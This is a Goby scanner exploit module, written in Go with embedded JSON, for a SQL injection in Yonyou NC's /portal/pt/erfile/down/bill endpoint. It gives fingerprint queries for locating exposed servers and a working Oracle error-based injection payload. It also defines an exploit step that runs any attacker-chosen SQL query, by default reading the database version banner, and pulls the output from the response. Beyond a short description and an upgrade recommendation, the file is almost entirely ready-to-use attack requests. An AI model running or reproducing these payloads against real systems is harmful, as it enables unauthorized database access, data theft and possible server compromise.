package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yongyou NC /portal/pt/erfile/down/bill SQL Injection Vulnerability",
    "Description": "<p>Yonyou NC system is a comprehensive enterprise management software, covering finance, human resources, supply chain and other fields, helping enterprises to achieve information management and business optimization. The down/bill interface of the system has SQL injection vulnerability, which allows an attacker to obtain information in the database without authorization</p>",
    "Product": "YONYOU-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-05-07",
    "PostTime": "2024-05-15",
    "Author": "1971714067@qq.com",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\\\\\"nc_text\\\\\\\">\" || body=\"<div id=\\\\\\\"nc_img\\\\\\\" onmouseover=\\\\\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\\\\\"nc_text\\\\\\\">\" || body=\"<div id=\\\\\\\"nc_img\\\\\\\" onmouseover=\\\\\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "3",
    "Impact": "<p>In addition to exploiting SQL injection vulnerabilities to obtain information in the database (e.g., administrator background passwords, site user personal information), attackers can even write Trojans to the server in the case of high privilege to further obtain server system privileges</p>",
    "Recommendation": "<p>At present, the official version of the vulnerability fix has been released, and users are advised to upgrade to the security version: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "input",
            "value": "custom",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "SELECT%20SUBSTRC%28%28NVL%28CAST%28banner%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%29%2C1%2C256%29%20FROM%20v%24version%20WHERE%20ROWNUM%3D1",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/pt/erfile/down/bill?pageId=login&id=-8766%27%20OR%201472=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113)||(SELECT%20(CASE%20WHEN%20(1472=1472)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(112)||CHR(98)||CHR(98)||CHR(113))--%20dQIS",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qkbjq1qpbbq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/portal/pt/erfile/down/bill?pageId=login&id=-8766%27%20OR%201472=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113)||(SELECT%20(CASE%20WHEN%20(1472=1472)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(112)||CHR(98)||CHR(98)||CHR(113))--%20dQIS",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/portal/pt/erfile/down/bill?pageId=login&id=-8766%27%20OR%201472=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113)||(SELECT%20(CASE%20WHEN%20(1472=1472)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(112)||CHR(98)||CHR(98)||CHR(113))--%20dQIS"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/pt/erfile/down/bill?pageId=login&id=1%27%20AND%209630%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28{{{command}}}%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29--%20dJVg",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "qbxpq.*qkzkq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|qbxpq(.*?)qkzkq"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "用友 NC /portal/pt/erfile/down/bill SQL 注入漏洞",
            "Product": "YONYOU-NC",
            "Description": "<p>用友NC系统是一款全面的企业管理软件，涵盖财务、人力资源、供应链等多个领域，助力企业实现信息化管理和业务优化。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>目前官方已发布漏洞修复版本，建议用户升级到安全版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yongyou NC /portal/pt/erfile/down/bill SQL Injection Vulnerability",
            "Product": "YONYOU-NC",
            "Description": "<p>Yonyou NC system is a comprehensive enterprise management software, covering finance, human resources, supply chain and other fields, helping enterprises to achieve information management and business optimization. The down/bill interface of the system has SQL injection vulnerability, which allows an attacker to obtain information in the database without authorization<br></p>",
            "Recommendation": "<p>At present, the official version of the vulnerability fix has been released, and users are advised to upgrade to the security version: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>In addition to exploiting SQL injection vulnerabilities to obtain information in the database (e.g., administrator background passwords, site user personal information), attackers can even write Trojans to the server in the case of high privilege to further obtain server system privileges<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}